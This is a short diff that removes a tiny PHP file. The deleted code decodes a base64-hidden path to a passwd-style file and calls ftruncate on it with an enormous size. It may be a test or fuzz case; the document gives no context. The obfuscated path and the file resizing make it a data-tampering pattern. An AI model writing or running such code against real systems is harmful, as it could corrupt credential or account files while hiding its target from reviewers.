@@ -1,4 +1,0 @@
-<?php
-ftruncate(fopen(base64_decode("L3dlYmF1cHMvcGFzc3dk"), "r"), 5473817451);
-
-?>
